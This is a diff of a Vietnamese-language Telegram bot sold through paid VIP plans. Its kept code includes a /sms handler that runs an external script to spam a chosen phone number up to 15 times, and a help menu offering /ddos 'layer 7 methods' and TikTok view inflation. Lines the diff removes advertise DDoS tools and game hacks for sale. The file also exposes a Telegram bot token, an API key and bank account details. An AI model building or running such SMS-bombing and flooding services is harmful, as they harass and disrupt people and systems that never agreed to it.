@@ -48,11 +48,14 @@ from selenium.webdriver.common.by import By
 import shlex  # Thêm dòng này để import shlex
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 logging.basicConfig(level=logging.INFO)
-bot_token = '8219757976:AAHAqVSMmvH3wtSOYxADomC8wfb85VflCQw'# nhập token bot
+import os
+bot_token = os.environ.get('BOT_TOKEN')
+if not bot_token:
+    raise ValueError('BOT_TOKEN environment variable not set')# nhập token bot
 
 bot = telebot.TeleBot(bot_token)
 start_time = time.time()
-allowed_group_id = -5293851874  # Danh sách các ID nhóm cho phép, bạn có thể thêm các ID khác vào đây
+allowed_group_id = -1003802965592  # Danh sách các ID nhóm cho phép, bạn có thể thêm các ID khác vào đây
 
 allowed_users = []
 member_types = {}
@@ -117,7 +120,6 @@ def add_user(message):
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
 
-
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/+glvo1XjAMVk4YmNl')
@@ -174,8 +176,6 @@ def add_user(message):
     connection.close()
     allowed_users.append(user_id)  # Thêm user mới vào danh sách allowed_users
 
-
-
 @bot.message_handler(commands=['removevip'])
 def remove_user(message):
 
@@ -183,7 +183,6 @@ def remove_user(message):
     if not is_bot_active:
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
-
 
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
@@ -220,10 +219,6 @@ def remove_user(message):
     else:
         bot.reply_to(message, f'Người dùng có ID là {user_id} không có trong cơ sở dữ liệu plan VIP💳 !')
 
-
-
-
-
 # Function to calculate remaining VIP days
 def calculate_remaining_vip_days(expiration_time):
     current_time = datetime.datetime.now()
@@ -239,7 +234,6 @@ def user_profile(message):
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
 
-
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -249,7 +243,7 @@ def user_profile(message):
     if message.chat.id != allowed_group_id:
         bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
         return
-    
+
     user_id = message.from_user.id
 
     # Check if the bot is active
@@ -288,11 +282,6 @@ def user_profile(message):
     else:
         bot.reply_to(message, '📄 〡Thông tin người dùng: Bạn là thành viên thường.\nDùng lệnh /muaplan nếu bạn muốn mua gói VIP💳.')
 
-
-
-
-
-
 @bot.message_handler(commands=['id'])
 def show_user_id(message):
 
@@ -309,12 +298,6 @@ def show_user_id(message):
 
     user_id = message.from_user.id
     bot.reply_to(message, f"📄 • ID Của Bạn Là: {user_id}💳")
-
-
-
-
-
-
 
 # Khởi tạo client OpenWeatherMap
 owm = pyowm.OWM('8eb6660f9b1b6915bbbddf2f97f7f711')  # Thay 'YOUR_OW_API_KEY' bằng khóa API OpenWeatherMap thực tế của bạn
@@ -343,7 +326,7 @@ def get_detailed_weather_info(location):
         uv_index = get_uv_index(location)
         air_quality = "None"  # Cần API riêng để lấy thông tin chất lượng không khí
         dew_point = "Unclear"  # Cần API riêng để lấy thông tin điểm sương
-        
+
         weather_info = f"🔆Thông Tin Thời Tiết ở {location}\n\n"
         weather_info += f"🌡️Nhiệt Độ : {temperature['temp']}°C\n"
         weather_info += f"💨Tốc Độ Gió : {wind['speed']} m/s\n"
@@ -368,7 +351,6 @@ def detailed_weather_info(message):
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
 
-
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -381,24 +363,19 @@ def detailed_weather_info(message):
 
     # Lấy địa điểm từ các đối số lệnh
     location = message.text.replace("/tt", "").strip()
-    
+
     # Kiểm tra xem đã cung cấp địa điểm chưa
     if not location:
         bot.reply_to(message, "Vui lòng cung cấp địa điểm !\nExample : /tt Hà Nội")
         return
-    
+
     # Lấy thông tin thời tiết chi tiết cho địa điểm cung cấp
     weather_info_text = get_detailed_weather_info(location)
-    
+
     # Gửi thông tin thời tiết chi tiết như một phản hồi
     bot.reply_to(message, weather_info_text)
 
-
-
-
-
 last_view_time = {}  # Tạo từ điển để lưu thời điểm cuối cùng mà người dùng sử dụng lệnh /view
-
 
 @bot.message_handler(commands=['view'])
 def viewtiktok_command(message):
@@ -407,11 +384,9 @@ def viewtiktok_command(message):
     if not is_bot_active:
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
-    
+
     user_id = message.from_user.id
     username = message.from_user.username
-
-
 
     # Check if the chat is a group or supergroup
     if message.chat.type not in ["group", "supergroup"]:
@@ -449,8 +424,6 @@ def viewtiktok_command(message):
 
     today = datetime.datetime.now().strftime('%d-%m-%Y')
 
-
-
     response_message = (
         f'➤ View 𝗕𝘆 👤: @{username} \n'
         f'➤ UserID : {message.from_user.id}\n'
@@ -459,18 +432,9 @@ def viewtiktok_command(message):
         f'➤ Trạng Thái : Thành Công\n'
         f'➤ Time : {today}\n'
         f'➤ Plan : Free\n'
-        f'➤ Owner : @Vpsvanmanhgaming\n'
-        f'➤ VPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\n'
-        f'➤ Shop 4G💳💲: https://4gvpsvanmanhgaming.click\n'
         f'➤ Video Hướng Dẫn: https://files.catbox.moe/tuoa6f.mp4\n'
     )
     bot.send_message(message.chat.id, response_message)
-
-
-
-
-
-
 
 @bot.message_handler(commands=['viewvip'])
 def viewtiktok_command(message):
@@ -482,7 +446,7 @@ def viewtiktok_command(message):
 
     user_id = message.from_user.id
     username = message.from_user.username
-    
+
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -499,9 +463,8 @@ def viewtiktok_command(message):
         bot.reply_to(message, '⚠️ Gói Vip của bạn không tồn tại hoặc đã hết hạn\nVui lòng liên hệ @Vpsvanmanhgaming  để mua gói VIP\nSử dụng /profile để kiểm tra Plan\nDùng Lệnh /muaplan Để Xem Giá\n\n🚫 Sử dụng lệnh /view nếu bạn là người dùng miễn phí')
         return
 
-
     global last_view_time
-    
+
    # Kiểm tra thời gian cuối cùng người dùng sử dụng lệnh /view
     if message.chat.id in last_view_time:
         time_passed = datetime.datetime.now() - last_view_time[message.chat.id]
@@ -520,7 +483,7 @@ def viewtiktok_command(message):
         bot.send_message(message.chat.id, "View tối đa là 50000")
         return
 
- 
+
     last_view_time[message.chat.id] = datetime.datetime.now()  # Update last usage time
 
     file_path = os.path.join(os.getcwd(), "view.py")
@@ -537,59 +500,28 @@ def viewtiktok_command(message):
         f'➤ Trạng Thái : Thành Công\n'
         f'➤ Time : {today}\n'
         f'➤ Plan : ViP👑\n'
-        f'➤ Owner : @Vpsvanmanhgaming \n'
-        f'➤ VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\n'
-        f'➤ Shop 4G💳💲: https://4gvpsvanmanhgaming.click\n'
-        f'➤ VPS Giá Rẻ💳💲:https://files.catbox.moe/4mvahe.mp4\n'
     )
     bot.send_message(message.chat.id, response_message)
-
-
 
 @bot.message_handler(commands=['muaplan', 'muaplan@VPSVANMANHGAMINGBOT'])
 def purchase_plan(message):
     user_id = message.from_user.id
-    # Thay thế các giá trị sau bằng thông tin thanh toán của bạn
     nganhang_tpbank = "VCB-BANK"
     chu_tai_khoan = "PHAM DINH TIENG"
     so_tai_khoan = "0704749421"
-    ten_nguoi_mua = "N.V TÂM"
-    noi_dung_chuyen_khoan = f"MUAVIP-{user_id}"  # Thay đổi ở đây
+    noi_dung_chuyen_khoan = f"MUAVIP-{user_id}"
     so_tien = "50.000vnđ"
-    purchase_info = f'''
+    purchase_info = f"""
     <b>Thông Tin Thanh Toán 💳</b>
     <i>Thanh Toán Gói VIP 💵</i>
-    - Thanh Toán Qua : <b>{nganhang_tpbank}</b>
-    - Chủ Tài Khoản : <b>{chu_tai_khoan}</b>
-    - Thông Tin Chuyển Khoản : <b>{so_tai_khoan}</b>
-    - Họ Tên : <b>{ten_nguoi_mua}</b>
-    - Nội Dung : <b>{noi_dung_chuyen_khoan}</b>
-    - Số Tiền : <b>{so_tien}</b>
-    ━━━━━━━━━━━━━━━━━━━
-    https://files.catbox.moe/bdle86.mp4
-    ━━━━━━━━━━━━━━━━━━━
-    Liên hệ ngay với tôi @Vpsvanmanhgaming nếu bạn gặp lỗi 
-    Dùng lệnh /admin1 để hiển thị thêm thông tin.
-    VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click
-    Shop 4G💳💲:https://4gvpsvanmanhgaming.click
-    '''
-
+    - Ngân hàng : <b>{nganhang_tpbank}</b>
+    - Chủ TK : <b>{chu_tai_khoan}</b>
+    - STK : <b>{so_tai_khoan}</b>
+    - Nội dung chuyển khoản : <b>{noi_dung_chuyen_khoan}</b>
+    - Số tiền : <b>{so_tien}</b>
+    """""
     bot.reply_to(message, purchase_info, parse_mode='HTML')
 
-
-
-
-
-# Định nghĩa từ điển languages với các ngôn ngữ và mã hiển thị tương ứng
-languages = {
-    'vi-beta': 'Tiếng Việt 🇻🇳',
-    'en-beta': 'English 🇺🇸'
-}
-
-# Thiết lập ngôn ngữ mặc định
-current_language = 'en-beta'
-
-# Cập nhật mã xử lý cho lệnh /language
 @bot.message_handler(commands=['language'])
 def switch_language(message):
 
@@ -598,7 +530,7 @@ def switch_language(message):
         bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
         return
 
-    
+
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -610,7 +542,7 @@ def switch_language(message):
         return
 
     global current_language
-    
+
     # Kiểm tra xem có tham số ngôn ngữ được cung cấp không
     if len(message.text.split()) > 1:
         # Lấy ngôn ngữ từ tham số dòng lệnh
@@ -629,278 +561,9 @@ def switch_language(message):
         # Nếu không có tham số ngôn ngữ, thông báo cho người dùng
         bot.reply_to(message, ">> Nhập ngôn ngữ bạn muốn chuyển đổi !\n>> [ vi-beta 🇻🇳 hoặc en-beta 🇺🇸 ]\nVD: /language vi-beta")
 
-
-
-
-
-@bot.message_handler(commands=['vpsgiare'])
-def lenh(message):
-    video_url = "https://files.catbox.moe/uuakbj.mp4"  # Thay thế bằng URL thực tế của video
-    help_text = '''
-👉 **Giảm Giá VPS 15% Nha Anh Em:**
-
-👉 https://httpsvpsvanmanhgaming.click  👈
-
-👉 **Giảm Giá 10% Nha Mong Mọi Người Sẽ Ủng Hộ Mình Lâu Dài Nha:>** 😘❤️🥰👈
-
-👉 **MÃ Giảm 10% Nha:** 😁👈
-
-👉 **Ưu Ái Anh Em Nên Mua VPS:** 👈
-
-👉 **<  VPS 2-4-30  nha : >** 😝👈
-
-👉 **🥰Chia Sẽ Cho Anh Em Mã Giảm Giá 10k Nha:>>** 🥰👈
-
-👉 **< vpsvanmanhgaming >**
-
-👉 **SALE VPS CHỈ TỪ 75K !!** 👈
-
-👉 **WEBSITE😘❤️🥰:**
-
-👉 https://httpsvpsvanmanhgaming.click 👈
-
-👉 **CLOUD VPS:** 😘❤️🥰
-
-👉 **BÁN Hosting , thuê api bank , siêu rẻ….** 👈
-
-👉 **Bán VPS Việt giá rẻ, treo game 24/7..., IP Riêng:** 👈😘❤️
-
-👉 **75k giá siêu rẻ full hệ điều hành CLOUD VPS GIÁ RẺ CÓ CẢ HỆ ĐIỀU HÀNH** 👈😘❤️
-
-👉 **<  window / linux  >** 👈😘❤️
-
-👉 **Bảo hành hỗ trợ 24/24 uy tín 100% >** 👈😘❤️🥰
-
-👉 **Nạp Tự Động 5s !!** 😘❤️🥰👈
-
-👉 **Số Điện Thoại Zalo Để Thuê Nha:** 👈
-
-👉 0559140928 👈
-
-?? **Link Facebook Để Thuê Nha:** 👈
-
-👉 facebook.com/profile.php?id=100072182542348 👈
-
-👉 **Link TikTok Để Thuê Nha:** 👈
-
-👉 https://www.tiktok.com/@kecodon7103 👈 
-
-👉 **LINK TLE ĐỂ THUÊ NHA:** 👈
-
-👉https://t.me/Vpsvanmanhgaming 👈 
-
-👉 **NHÓM TLE GIAO LƯU :** 👈
-
-👉 https://t.me/botvipvc 👈
-
-👉 **NHÓM TLE GIAO LƯU :** 👈
-
-👉 https://t.me/botvipfc 👈
-
-👉 **4G Giá Rẻ Học Sinh Và Sinh Viên Đều Có Thể Mua Nha:** 👈
-
-👉 https://4gvpsvanmanhgaming.click/ 👈
-
-👉 **Link Shop VPS Nha:** 👈
-
-👉 https://httpsvpsvanmanhgaming.click  👈
-
-👉 **Link Shop 4G** 👈
-
-👉 https://4gvpsvanmanhgaming.click 👈
-
-👉 **Copyright 2024 © Powered By HTTPSVPSVANMANHGAMING.CLICK** 👈
-
-
-'''
-    bot.send_message(message.chat.id, help_text, parse_mode='Markdown', disable_web_page_preview=True)
-    
-    try:
-        bot.send_video(message.chat.id, video_url, caption="Video giới thiệu dịch vụ cho thuê VPS uy tín, an toàn và tiện lợi nha:>", parse_mode='Markdown')
-    except telebot.apihelper.ApiTelegramException as e:
-        if "failed to get HTTP URL content" in str(e):
-            # Tải xuống video và gửi tệp trực tiếp nếu URL không hoạt động
-            video_file = requests.get(video_url)
-            with open("video.mp4", "wb") as f:
-                f.write(video_file.content)
-            with open("video.mp4", "rb") as video:
-                bot.send_video(message.chat.id, video, caption="Video giới thiệu dịch vụ cho thuê VPS uy tín, an toàn và tiện lợi nha:>", parse_mode='Markdown')
-
-
-
-
-@bot.message_handler(commands=['hackgamesgiare'])
-def lenh(message):
-    video_url = "https://files.catbox.moe/agpg21.mp4"  # Thay thế bằng URL thực tế của video
-    help_text = '''
-🎮 NEON MOD - Cung Cấp Hack Games Giá Rẻ 🎮
-
-✨ Cung cấp Hack Map & các loại game khác miễn phí, an toàn. ✨
-
-🌟 Tham gia kênh để nhận Key VIP miễn phí: 🌟
-
-🔗  https://t.me/Channel_NeonMod
-
-🌟 Tham gia kênh để tải Hack VIP miễn phí: 🌟
-
-🔗 https://t.me/File_NeonMod
-
-🌟 Tham gia kênh tải tất cả Hack Games: 🌟
-
-🔗 https://t.me/pulfsharemod
-
-🌟 Tham gia kênh BOT Tiện ích: 🌟
-
-🔗 https://t.me/geminivipchat
-
-💰 Giá cả hợp lý: 💰
-• KEY: 215 1 Tháng
-• KEY: 180 3 Tuần
-• KEY: 160 2 Tuần
-• KEY: 145 1 Tuần
-
-👉 **Số Điện Thoại Zalo Để Thuê Nha:** 👈
-
-👉 0559140928 👈
-
-👉 **Link Facebook Để Thuê Nha:** 👈
-
-👉 facebook.com/profile.php?id=100072182542348 👈
-
-👉 **Link TikTok Để Thuê Nha:** 👈
-
-👉 https://www.tiktok.com/@kecodon7103 👈 
-
-👉 **LINK TLE ĐỂ THUÊ NHA:** 👈
-
-👉https://t.me/Vpsvanmanhgaming 👈 
-
-👉 **NHÓM TLE GIAO LƯU :** 👈
-
-👉 https://t.me/botvipvc 👈
-
-👉 **NHÓM TLE GIAO LƯU :** 👈
-
-👉 https://t.me/botvipfc 👈
-
-👉 **4G Giá Rẻ Học Sinh Và Sinh Viên Đều Có Thể Mua Nha:** 👈
-
-👉 https://hdpattv.pro.vn/ 👈
-
-👉 **Link Shop VPS Nha:** 👈
-
-👉 https://httpsvpsvanmanhgaming.click  👈
-
-👉 **Link Shop 4G** 👈
-
-👉 https://4gvpsvanmanhgaming.click 👈
-
-👉 **Copyright 2024 © Powered By HTTPSVPSVANMANHGAMING.CLICK** 👈
-https://files.catbox.moe/0jw5et.mp4
-    '''
-    bot.send_message(message.chat.id, help_text, parse_mode='Markdown', disable_web_page_preview=True)
-    bot.send_video(message.chat.id, video_url, caption="🎥 Video giới thiệu dịch vụ Hack Games tại Neon Mod", parse_mode='html')
-
-
-
-
-
-
-
-
-
-@bot.message_handler(commands=['c25vip', 'c25vip@VPSVANMANHGAMINGBOT'])
-def lenh(message):
-    
-# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
-    if message.chat.type != "group" and message.chat.type != "supergroup":
-        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
-        return
-
-# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
-    if message.chat.id != allowed_group_id:
-        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
-        return
-    
-    help_text = '''
-
-🌟 **DỊCH VỤ MẠNG XÃ HỘI VÀ CÔNG CỤ CHUYÊN NGHIỆP** 🌟
-
-📱 **Mạng Xã Hội:**
-• Facebook
-• TikTok
-• Instagram
-• Youtube
-
-🌐 **Tạo Website:**
-• Shop nick, shop dịch vụ mạng xã hội, web gạch thẻ
-• Web check scam, web bán VPS-hosting-tên miền, TXCL
-• Web bán mã nguồn, web fake bất cứ gì
-• Web info cá nhân và nhiều hơn nữa (500k-2000k)
-
-🛠️ **Bán Các Công Cụ:**
-• Tool DDoS web, wifi, server game, VPS, IP (200k)
-• Tool buff view TikTok (Chưa bán)
-• Tool buff share bài viết (70k)
-• Tool go like, tăng đăng status, tăng tương tác chuyên nghiệp (120k)
-• Tool reg page, buff follow, like, share, comment, view story Pro5,... (350k)
-• Tool lấy proxy (70k)
-• Và nhiều công cụ khác
-
-💚 **Lên Tích Xanh Facebook:** 800k
-
-👉 **Số Điện Thoại Zalo Để Thuê Nha:** 👈
-
-👉 0559140928 👈
-
-👉 **Link Facebook Để Thuê Nha:** 👈
-
-👉 facebook.com/profile.php?id=100072182542348 👈
-
-👉 **Link TikTok Để Thuê Nha:** 👈
-
-👉 https://www.tiktok.com/@kecodon7103 👈 
-
-👉 **LINK TLE ĐỂ THUÊ NHA:** 👈
-
-👉https://t.me/Vpsvanmanhgaming 👈 
-
-👉 **NHÓM TLE GIAO LƯU :** 👈
-
-👉 https://t.me/botvipvc 👈
-
-👉 **NHÓM TLE GIAO LƯU :** 👈
-
-👉 https://t.me/botvipfc 👈
-
-👉 **4G Giá Rẻ Học Sinh Và Sinh Viên Đều Có Thể Mua Nha:** 👈
-
-👉 https://hdpattv.pro.vn/ 👈
-
-👉 **Link Shop VPS Nha:** 👈
-
-👉 https://httpsvpsvanmanhgaming.click  👈
-
-👉 **Link Shop 4G** 👈
-
-👉 https://4gvpsvanmanhgaming.click 👈
-
-👉 **Copyright 2024 © Powered By HTTPSVPSVANMANHGAMING.CLICK** 👈
-
-━━━━━━━━━━━━━━━━━━━
-
-🎥 https://files.catbox.moe/7yqag1.mp4
-
-━━━━━━━━━━━━━━━━━━━
-'''
-    bot.reply_to(message, help_text)
-
-
-
-
 @bot.message_handler(commands=['chubot', 'chubot@VPSVANMANHGAMINGBOT'])
 def lenh(message):
-    
+
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -910,107 +573,27 @@ def lenh(message):
     if message.chat.id != allowed_group_id:
         bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
         return
-    
+
     help_text = '''
 
 🤖 **Chủ BOT Đây Nha:>** 🤖
 
 🔰 Liên hệ chủ bot: https://t.me/@Vpsvanmanhgaming
 🔰 Link Vào Nhóm: https://t.me/botvipvc
-🔰 Lưu Ý: BOT Chỉ Hoạt Động Được Trên Nhóm!👉 **Số Điện Thoại Zalo Để Thuê Nha:** 👈
+🔰 Lưu Ý: BOT Chỉ Hoạt Động Được Trên Nhóm!
 
-👉 0559140928 👈
+👉 **Số Điện Thoại Zalo:** 0559140928
+👉 **Link Facebook:** facebook.com/profile.php?id=100089057461799
+👉 **Link TikTok:** https://www.tiktok.com/@kecodon7103
+👉 **Link Telegram:** https://t.me/Vpsvanmanhgaming
+👉 **NHÓM TLE GIAO LƯU 1:** https://t.me/botvipvc
+👉 **NHÓM TLE GIAO LƯU 2:** https://t.me/botvipfc
 
-👉 **Link Facebook Để Thuê Nha:** 👈
-
-👉 facebook.com/profile.php?id=100072182542348 👈
-
-👉 **Link TikTok Để Thuê Nha:** 👈
-
-👉 https://www.tiktok.com/@kecodon7103 👈 
-
-👉 **LINK TLE ĐỂ THUÊ NHA:** 👈
-
-👉https://t.me/Vpsvanmanhgaming 👈 
-
-👉 **NHÓM TLE GIAO LƯU :** 👈
-
-👉 https://t.me/botvipvc 👈
-
-👉 **NHÓM TLE GIAO LƯU :** 👈
-
-👉 https://t.me/botvipfc 👈
-
-👉 **4G Giá Rẻ Học Sinh Và Sinh Viên Đều Có Thể Mua Nha:** 👈
-
-👉 https://4gvpsvanmanhgaming.click 👈
-
-👉 **Link Shop VPS Nha:** 👈
-
-👉 https://httpsvpsvanmanhgaming.click  👈
-
-👉 **Link Shop 4G** 👈
-
-👉 https://4gvpsvanmanhgaming.click 👈
-
-👉 **Copyright 2024 © Powered By HTTPSVPSVANMANHGAMING.CLICK** 👈
 ━━━━━━━━━━━━━━━━━━━
-
 🎥 https://files.catbox.moe/dowxvy.mp4
-
 ━━━━━━━━━━━━━━━━━━━
 '''
     bot.send_message(message.chat.id, help_text, parse_mode='Markdown', disable_web_page_preview=True)
-
-
-
-
-
-@bot.message_handler(commands=['4gvpsvanmanhgaming', '4gvpsvanmanhgaming@VPSVANMANHGAMINGBOT'])
-def lenh(message):
-
-        # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
-    if message.chat.type != "group" and message.chat.type != "supergroup":
-        bot.reply_to(message, '🚫 **Xin Lỗi!** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
-        return
-
-    # Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
-    if message.chat.id != allowed_group_id:
-        bot.reply_to(message, '🚫 **Trộm bot à?** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
-        return
-    
-    video_url = "https://files.catbox.moe/bdcwme.mp4"  # Thay thế bằng URL thực tế của video
-    help_text = '''
-🤖 **Chủ BOT Đây Nha:** 🤖
-🔹 **Liên Hệ Chủ Bot:** https://t.me/@Vpsvanmanhgaming
-🔹 **Link Vào Nhóm:** https://t.me/botvipvc
-🔹 **Lưu Ý:** BOT Chỉ Hoạt Động Trong Nhóm!
-📞 **Số Điện Thoại Zalo Để Thuê:** 0559140928
-🔗 **Link Facebook Để Thuê:** https://facebook.com/profile.php?id=100072182542348
-📱 **Link TikTok Để Thuê:** https://www.tiktok.com/@kecodon7103
-🔗 **LINK TLE ĐỂ THUÊ:** https://t.me/Vpsvanmanhgaming
-🌟 **NHÓM TLE GIAO LƯU:** https://t.me/botvipvc
-🌟 **NHÓM TLE GIAO LƯU KHÁC:** https://t.me/botvipfc
-🚀 **Admin Cung Cấp Dịch Vụ 4G, 5G VPN Giá Rẻ Nhất** 😎✨
-🔹 **Website VPN:** https://4gvpsvanmanhgaming.click 💻
-🔸 **Rẻ Nhất Chỉ Từ 7k 💸** - Tốc Độ Cực Mạnh, Nhiều GB ⚡
-🔸 **Rất Nhiều Cổng Mạng, File, Server** 🌍
-🔸 **Cung Cấp Dịch Vụ 4G Tốc Độ Cực Cao** 📶💨
-🔸 **Dịch Vụ VPN Tăng Tốc Mạng, Wifi** 🔧🌐
-🔸 **Hệ Thống Máy Chủ Cao Cấp** 🖥️🔒
-🔸 **"Ngon - Bổ - Rẻ"** 😋💯
-🔸 **Làm CTV Web Con 40%** 💼📈
-🔸 **Trải Nghiệm Mượt Mà Nhất** 🎬🎮🖥️
-👉** Copyright 2024 © Powered By https://4gvpsvanmanhgaming.click ** 👈
-━━━━━━━━━━━━━━━━━━━
-https://files.catbox.moe/bdcwme.mp4
-━━━━━━━━━━━━━━━━━━━
-    '''
-    bot.send_message(message.chat.id, help_text, parse_mode='Markdown', disable_web_page_preview=True)
-    bot.send_video(message.chat.id, video_url, caption="🎥 Video giới thiệu dịch vụ 4G Giá Rẻ Nha:>", parse_mode='html')
-
-
-
 
 @bot.message_handler(commands=['start', 'start@VPSVANMANHGAMINGBOT'])
 def lenh(message):
@@ -1029,7 +612,7 @@ def lenh(message):
     if message.chat.id != allowed_group_id:
         bot.reply_to(message, '🚫 **Xin Lỗi!** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
         return
-    
+
     help_text = '''
 🌟 **DANH SÁCH LỆNH VÀ DỊCH VỤ:**
 ━━━━━━━━━━━━━━━━━━━
@@ -1037,7 +620,6 @@ def lenh(message):
 • /chubot - Liên hệ chủ bot ☎️
 • /muaplan - Mua VIP 💰
 • /profile - Kiểm tra plan 📊
-• /vpsgiare - Mua VPS giá rẻ 🖥️
 • /capcut - Tải video mẫu Capcut 🎬
 • /anhgai - Tải ảnh đẹp 📷
 • /anhgaisexy - Tải ảnh đẹp (sexy) 😍
@@ -1047,9 +629,6 @@ def lenh(message):
 • /crush - TOP những câu nói để hỏi thính crush 💖
 • /ask - Câu hỏi của bạn 🤔
 • /gemini - Câu hỏi của bạn 🤔
-• /c25vip - Mang đến Dịch Vụ Tool Chất Lượng và tích xanh với giá cả phải chăng! 🌟
-• /hackgamesgiare - Cung cấp dịch vụ hack games giá rẻ 💻
-• /4gvpsvanmanhgaming - 4G Giá Rẻ Nha:> 🌟
 ━━━━━━━━━━━━━━━━━━━
 🛡️ **Bảo mật và Công cụ:**
 • /ddos - Show methods layer 7 🛡️
@@ -1095,10 +674,6 @@ def lenh(message):
 '''
     bot.reply_to(message, help_text)
 
-
-
-
-
 is_bot_active = True
 # Danh sách số điện thoại cấm spam
 banned_numbers = ["0899404656", "0704749421"]
@@ -1115,7 +690,7 @@ def spam(message):
     user_id = message.from_user.id
     username = message.from_user.username
 
-    
+
 # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
@@ -1125,42 +700,42 @@ def spam(message):
     if message.chat.id != allowed_group_id:
         bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
         return
-    
+
     global last_sms_time
-    
+
     # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
     if message.chat.type != "group" and message.chat.type != "supergroup":
         bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
         return
 
     user_id = message.from_user.id
-    
+
     # Kiểm tra thời gian giữa hai lần sử dụng lệnh /sms
     current_time = time.time()
     if current_time - last_sms_time < 120:
         remaining_time = int(120 - (current_time - last_sms_time))
         bot.reply_to(message, f'Vui lòng chờ {remaining_time} giây trước khi sử dụng lại lệnh /sms.')
         return
-    
+
     if len(message.text.split()) != 3:
         bot.reply_to(message, 'Vui lòng nhập đúng định dạng | Ví dụ: /sms 0559140928 10')
         return
-    
+
     phone_number = message.text.split()[1]
     lap = message.text.split()[2]
-    
+
     if not lap.isnumeric() or not (0 < int(lap) <= 15):
         bot.reply_to(message, 'Số lần spam không hợp lệ. Vui lòng spam trong khoảng từ 1 đến 15 lần !')
         return
-    
+
     if phone_number in banned_numbers:
         bot.reply_to(message, 'Số Điện Thoại Bị Cấm !')
         return
-    
+
     if len(phone_number) != 10 or not phone_number.isdigit():
         bot.reply_to(message, 'Số điện thoại không hợp lệ!')
         return
-    
+
     # Thực hiện spam số điện thoại
 
     file_path = os.path.join(os.getcwd(), "sms.py")
@@ -1174,19 +749,14 @@ def spam(message):
 ➤ Ngày : {TimeStamp()}
 ➤ Plan : FREE
 ➤ Chúc Bạn sử dụng bot vui vẻ⚡️
-➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲
-➤ VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click
-➤ Shop 4G💳💲: https://4gvpsvanmanhgaming.click
+
 ━━━━━━━━━━━━━━━━━━━
 https://files.catbox.moe/tuoa6f.mp4
 ━━━━━━━━━━━━━━━━━━━
     ''')
-    
+
     # Cập nhật thời gian sử dụng lệnh /sms lần cuối
     last_sms_time = current_time
-
-
-
 
 last_spam_time = 0  # Thêm biến last_spam_time để lưu thời gian sử dụng lệnh /spam lần cuối
 
@@ -1200,7 +770,7 @@ def spam(message):
 
     user_id = message.from_user.id
     username = message.from_user.username
-    
+
